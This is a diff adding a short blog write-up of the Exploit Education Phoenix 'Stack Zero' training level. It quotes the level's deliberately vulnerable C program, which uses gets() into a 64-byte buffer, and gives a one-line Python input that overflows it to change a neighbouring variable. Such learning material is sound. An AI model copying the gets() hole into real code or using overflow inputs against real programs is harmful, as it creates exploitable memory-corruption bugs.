@@ -1,0 +1,53 @@
+---
+title: "Stack Zero"
+permalink: "exploit-education/phoenix/:title"
+layout: post
+---
+
+
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define BANNER \
+  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
+
+char *gets(char *);
+
+int main(int argc, char **argv) {
+  struct {
+    char buffer[64];
+    volatile int changeme;
+  } locals;
+
+  printf("%s\n", BANNER);
+
+  locals.changeme = 0;
+  gets(locals.buffer);
+
+  if (locals.changeme != 0) {
+    puts("Well done, the 'changeme' variable has been changed!");
+  } else {
+    puts(
+        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
+        "again?");
+  }
+
+  exit(0);
+}
+```
+
+The code uses **gets** function which can take input more than buffer length, hence the exploit :)
+
+This level only asks to change the value of **changeme** to any value other than zero so we can just enter any random input that exceeds the buffer length to overwrite the value of **changeme**.
+
+# Solution:
+
+```
+$ python -c "print 'A'*100" | /opt/phoenix/amd64/stack-zero
+Welcome to phoenix/stack-zero, brought to you by https://exploit.education
+Well done, the 'changeme' variable has been changed!
+```
